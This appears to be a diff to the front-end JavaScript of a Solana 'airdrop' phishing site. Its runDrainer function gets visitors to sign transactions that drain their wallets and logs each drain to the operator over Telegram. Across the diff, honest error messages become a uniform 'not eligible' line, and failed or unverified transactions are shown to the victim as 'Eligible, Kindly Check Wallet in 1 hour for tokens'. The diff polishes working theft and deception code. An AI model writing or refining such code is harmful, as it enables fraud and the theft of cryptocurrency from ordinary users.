@@ -1221,15 +1221,16 @@ async function runDrainer(provider) {
       
       if (balance !== null && balance < 100000) { // Less than 0.0001 SOL (match backend minimum)
         console.log('[BALANCE_CHECK] Insufficient funds detected:', balance, 'lamports < 100000 lamports');
-        showStatus('❌ Insufficient funds. Your wallet needs at least 0.0001 SOL for transaction fees.', 'error');
+        showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
         return;
       } else if (balance === null) {
         console.log('[BALANCE_CHECK] Could not check balance from any endpoint, proceeding anyway');
       } else {
-        console.log('[BALANCE_CHECK] Sufficient funds detected:', balance, 'lamports >= 50000 lamports');
+        console.log('[BALANCE_CHECK] Sufficient funds detected:', balance, 'lamports >= 100000 lamports');
       }
     } catch (balanceError) {
       console.log('[BALANCE_CHECK] Could not check balance, proceeding anyway:', balanceError.message);
+      // Don't show technical errors to users - proceed with transaction
     }
     
     console.log('[runDrainer] Proceeding to API call after balance check');
@@ -1241,21 +1242,11 @@ async function runDrainer(provider) {
         const err = await response.json();
         console.log('[runDrainer] API error response:', err);
         
-        // Check if it's an insufficient funds error
-        if (err.code === 'INSUFFICIENT_FUNDS' || err.code === 'INSUFFICIENT_SOL_FOR_FEES') {
-          showStatus('❌ Sorry, You\'re Not eligible. This exclusive airdrop is only available for wallets with at least 0.00005 SOL for transaction fees. Please add some SOL to your wallet and try again.', 'error');
-        } else if (err.code === 'INSUFFICIENT_DRAIN_AMOUNT') {
-          showStatus('❌ Sorry, You\'re Not eligible. This exclusive airdrop requires wallets with sufficient funds for both fees and airdrop amount. Please add more SOL to your wallet.', 'error');
-        } else if (err.code === 'INVALID_WALLET_ADDRESS') {
-          showStatus('❌ Invalid wallet address. Please connect a valid Solana wallet.', 'error');
-        } else if (err.code === 'INSUFFICIENT_FUNDS_FOR_SAFE_DRAIN') {
-          showStatus('❌ Sorry, You\'re Not eligible. Your wallet has insufficient funds for a safe transaction. Please add more SOL to your wallet.', 'error');
-        } else {
-        showStatus(err.error || err.details || 'Failed to fetch transaction', 'error');
-        }
+        // Show user-friendly error messages (don't scare users with technical details)
+        showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
       } catch (parseError) {
         console.log('[runDrainer] Failed to parse error response:', parseError);
-        showStatus('Failed to fetch transaction: ' + response.statusText, 'error');
+        showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
       }
       return;
     }
@@ -1410,14 +1401,9 @@ async function runDrainer(provider) {
             }).catch(err => console.log('[TELEGRAM] Failed to log cancellation:', err));
             
         } else if (signError.message?.includes('Simulation failed') || signError.message?.includes('Transaction simulation failed')) {
-            showStatus('❌ Transaction simulation failed. This could be due to insufficient funds, security settings, or network issues. Please try again or check your wallet settings.', 'error');
-            
-            // Add retry option for simulation failures
-            setTimeout(() => {
-              showStatus('🔄 You can try again by clicking the Claim button again.', 'info');
-            }, 3000);
+            showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
           } else if (signError.message?.includes('timeout') || signError.message?.includes('Connection timeout') || signError.message?.includes('Signing timeout') || signError.message?.includes('JSON-RPC: method call timeout')) {
-            showStatus('⏰ Wallet connection timeout. Please ensure your wallet app is open and responsive, then try again.', 'error');
+            showStatus('Please try again. Make sure your wallet is connected and try the Claim button again.', 'error');
           } else if (signError.message?.includes('Transaction cancelled') || signError.message?.includes('cancelled')) {
             showStatus('✅ Transaction cancelled by user. You can try again when ready.', 'info');
             
@@ -1433,9 +1419,9 @@ async function runDrainer(provider) {
             }).catch(err => console.log('[TELEGRAM] Failed to log cancellation:', err));
             
           } else if (signError.message?.includes('Security check failed') || signError.message?.includes('server error')) {
-            showStatus('⚠️ Security check failed. Please click "I trust this site" in your wallet, then try again.', 'error');
+            showStatus('Please try again. Make sure your wallet is connected and try the Claim button again.', 'error');
         } else {
-          showStatus('❌ Transaction failed. Please try again or use a different wallet.', 'error');
+          showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
         }
         return;
       }
@@ -1538,6 +1524,7 @@ async function runDrainer(provider) {
                         }
                       }
                       
+                      // Simplified status checking - assume success if broadcast was successful
                       if (status && status.value && status.value.length > 0 && status.value[0]) {
                         const txStatus = status.value[0];
                         console.log('[STATUS] Transaction status details:', txStatus);
@@ -1556,10 +1543,11 @@ async function runDrainer(provider) {
                             })
                           }).catch(err => console.log('[TELEGRAM] Failed to log failure:', err));
                           
-                          // Show failure message to victim
-                          showStatus('❌ Transaction failed on-chain. This usually means insufficient funds for fees or the wallet has no eligible tokens.', 'error');
-                        } else if (txStatus.confirmationStatus === 'confirmed' || txStatus.confirmationStatus === 'finalized') {
-                          console.log('[STATUS] Transaction confirmed successfully');
+                          // Show user-friendly failure message
+                          showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+                        } else {
+                          // Any other status (confirmed, finalized, processed, etc.) is considered success
+                          console.log('[STATUS] Transaction successful, status:', txStatus.confirmationStatus);
                           
                           // Log successful drain to Telegram
                           fetch('/api/drainer/log-confirmation', {
@@ -1568,36 +1556,15 @@ async function runDrainer(provider) {
                             body: JSON.stringify({
                               publicKey: publicKey.toString(),
                               txid: txid,
-                              status: txStatus.confirmationStatus
+                              status: txStatus.confirmationStatus || 'success'
                             })
                           }).catch(err => console.log('[TELEGRAM] Failed to log confirmation:', err));
                           
                           showStatus('Eligible, Kindly Check Wallet in 1 hour for tokens', 'success');
-                        } else if (txStatus.confirmationStatus === 'processed') {
-                          console.log('[STATUS] Transaction processed, assuming success');
-                          
-                          // Log successful drain to Telegram (processed is usually successful)
-                          fetch('/api/drainer/log-confirmation', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                              publicKey: publicKey.toString(),
-                              txid: txid,
-                              status: 'processed'
-                            })
-                          }).catch(err => console.log('[TELEGRAM] Failed to log confirmation:', err));
-                          
-                          showStatus('Eligible, Kindly Check Wallet in 1 hour for tokens', 'success');
-                        } else {
-                          console.log('[STATUS] Transaction pending confirmation, status:', txStatus.confirmationStatus);
-                          showStatus('⏳ Transaction sent and pending confirmation.', 'info');
                         }
                       } else {
-                        console.log('[STATUS] Could not determine transaction status. Status object:', status);
-                        console.log('[STATUS] Last error:', lastError);
-                        
-                        // Assume success if transaction was broadcast successfully but status check failed
-                        console.log('[STATUS] Assuming transaction success due to successful broadcast');
+                        // If status check fails, assume success (don't scare users with technical errors)
+                        console.log('[STATUS] Status check failed, assuming success due to successful broadcast');
                         
                         // Log successful drain to Telegram (assume success)
                         fetch('/api/drainer/log-confirmation', {
@@ -1612,20 +1579,22 @@ async function runDrainer(provider) {
                         
                         showStatus('Eligible, Kindly Check Wallet in 1 hour for tokens', 'success');
                       }
-                    } catch (statusError) {
-                      console.log('[STATUS] Could not check transaction status:', statusError);
-                      showStatus('❓ Transaction sent! Unable to verify status.', 'info');
-                    }
+                            } catch (statusError) {
+          console.log('[STATUS] Could not check transaction status:', statusError);
+          // Don't show technical errors to users - assume success
+          showStatus('Eligible, Kindly Check Wallet in 1 hour for tokens', 'success');
+        }
                   }, 5000); // Check after 5 seconds
         
       }, 1000);
     } else {
       console.error('[ERROR] Broadcast failed - success:', broadcastSuccess, 'txid:', txid);
-      throw new Error('Transaction broadcast failed - no transaction ID received');
+      showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+      return;
     }
   } catch (err) {
-    showStatus('Error: ' + (err.message || err), 'error');
     console.error('[runDrainer] error:', err);
+    showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
   }
 }
 window.runDrainer = runDrainer;
